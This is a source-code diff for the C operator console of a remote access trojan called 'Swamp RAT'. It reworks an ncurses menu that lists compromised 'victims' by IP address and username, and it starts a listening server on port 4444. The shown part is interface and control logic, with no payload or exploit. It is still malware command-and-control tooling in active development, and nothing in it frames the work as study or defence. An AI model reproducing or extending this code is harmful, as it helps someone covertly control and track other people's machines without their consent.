@@ -152,18 +152,18 @@ bool ncurses_item_cleanup(ITEM **items, int n_items){
   return true;
 }
 
-/* bool ncurses_item_victims(ITEM **items){ */
-/*   int j = 0; */
-/*   for(int i = 0; i < NET_MAX_CLIENTS; ++i){ */
-/*     if (p_victims[i] != NULL){ */
-/*       printf("[+] username:%s\n", p_victims[i]->sysinfo.username); */
-/*       items[j] = new_item(p_victims[i]->sysinfo.ip, */
-/*                           p_victims[i]->sysinfo.username); */
-/*       j++; */
-/*     } */
-/*   } */
-/*   return true; */
-/* } */
+bool ncurses_item_victims(ITEM **items){
+  int j = 0;
+  for(int i = 0; i < NET_MAX_CLIENTS; ++i){
+    if (p_victims[i] != NULL){
+      //printf("[+] username:%s\n", p_victims[i]->sysinfo.username);
+      items[j] = new_item(p_victims[i]->sysinfo.ip,
+                          p_victims[i]->sysinfo.username);
+      j++;
+    }
+  }
+  return true;
+}
 
 bool ncurses_window_victims(WINDOW *win_main,
                             MENU *menu,
@@ -204,10 +204,6 @@ bool ncurses_window_victims(WINDOW *win_main,
   return true;
 }
 
-void *thread1(){
-  net_start_server(4444);
-}
-
 bool ncurses_main(){
   /*
     :TODO: main ncurses interface
@@ -218,45 +214,37 @@ bool ncurses_main(){
   ITEM **items;
   MENU *menu;
   WINDOW *win_menu, *win_main;
-  pthread_t thread_net_server;
   char win_main_title[] = "|Swamp RAT|";
   char win_menu_title[] = "V1c71m5";
-
-  // create server thread
-  if (pthread_create(&thread_net_server, NULL, thread1, NULL) != 0){
-    fprintf(stderr, "[x] %s\n", strerror(errno));
-    return false;
-  }
 
   x_margin = 4;
   y_margin = 2;
 
-  // set env for correct terminal viewing
   if(putenv("TERM=linux") != 0){
     fprintf(stderr, "[x] %s\n", strerror(errno));
     return false;
   }
 
-  // initalize main window
   if ((win_main = initscr()) == NULL){
     fprintf(stderr, "[x] %s\n", strerror(errno));
     return false;
   }
 
-  // start colors and check for color support
   if (start_color() == ERR || !has_colors() || !can_change_color()){
     ncurses_window_cleanup(win_main);
     fprintf(stderr, "[x] %s\n", strerror(errno));
     return false;
   }
 
-  // hide cursor
+  if (net_server_async(4444) == false){
+    fprintf(stderr, "[x] failed to launch server\n");
+    return false;
+  }
+
   curs_set(0);
   
-  // get main window max width and height;
   getmaxyx(win_main, y, x);
   
-  // setup main window
   init_pair(NCURSES_MAIN_WIN_COLOR, COLOR_GREEN, COLOR_BLACK);
   init_pair(NCURSES_MENU_WIN_COLOR, COLOR_RED, COLOR_BLACK);
   wbkgd(win_main, COLOR_PAIR(NCURSES_MAIN_WIN_COLOR));
@@ -268,24 +256,10 @@ bool ncurses_main(){
   noecho();
   keypad(stdscr, true);
 
-  // set items for menu of victim machines
-  n_victims = ARRAY_SIZE(victims);
-  items = (ITEM **)calloc(n_victims, sizeof(ITEM *));
-  for(int i = 0; i < n_victims -1; ++i){
-    items[i] = new_item(itoa(i+1), victims[i]);
-  }
-
-  // create menu of victim machines
+  items = (ITEM **)calloc(NET_VICTIMS_TOTAL, sizeof(ITEM *));
+  ncurses_item_victims(items);
   menu = new_menu((ITEM **)items);
-
-
-  /* n_victims = net_get_victim_count(); */
-  /* items = (ITEM **)calloc(n_victims, sizeof(ITEM *)); */
-  /* ncurses_item_victims(items); */
-  /* menu = new_menu((ITEM **)items); */
   
-
-  // create menu window
   win_menu = newwin((y - (y_margin * 2)),
                     (x - (x_margin * 2)),
                     2,
@@ -299,16 +273,20 @@ bool ncurses_main(){
                          y_margin,
                          x_margin);
   wrefresh(win_menu);
-  
-  while((key = getch()) != 27){
-    switch(key){
-    case KEY_RESIZE:
+
+  n_victims = NET_VICTIMS_TOTAL;
+  while(true){
+    key = getch();
+    if (key == KEY_RESIZE){
       getmaxyx(win_main, y, x);
       wclear(win_main);
       wclear(win_menu);
       ncurses_window_border(win_main);
       ncurses_window_title(win_main, win_main_title);
       ncurses_window_footer(win_main, "|0.9b|");
+      items = (ITEM **)calloc(NET_VICTIMS_TOTAL, sizeof(ITEM *));
+      ncurses_item_victims(items);
+      menu = new_menu((ITEM **)items);
       ncurses_window_victims(win_main,
                              menu,
                              win_menu,
@@ -319,21 +297,29 @@ bool ncurses_main(){
                              x_margin);
       wrefresh(win_main);
       wrefresh(win_menu);
-      break;
-    case KEY_DOWN:
-      mvprintw(1, 1, "[+] victims: %d\n", NET_VICTIMS_TOTAL);
+    }
+    if (key == KEY_DOWN){
       menu_driver(menu, REQ_DOWN_ITEM);
+      refresh();
       wrefresh(win_menu);
       wrefresh(win_main);
-      break;
-    case KEY_UP:
-      menu_driver(menu, REQ_UP_ITEM);
-      wrefresh(win_menu);
-      break;
     }
-  }	
+    if (key == KEY_UP){
+      menu_driver(menu, REQ_UP_ITEM);
+      refresh();
+      wrefresh(win_menu);
+      wrefresh(win_main);
+    }
+    if (n_victims != NET_VICTIMS_TOTAL){
+      mvprintw(1, 1, "[+] victims: %d\n", NET_VICTIMS_TOTAL);
+      refresh();
+      wrefresh(win_main);
+      wrefresh(win_menu);
+    }
+  }
+  
   ncurses_menu_cleanup(menu);
-  ncurses_item_cleanup(items, n_victims);
+  ncurses_item_cleanup(items, NET_VICTIMS_TOTAL);
   endwin();
   return true;
 }
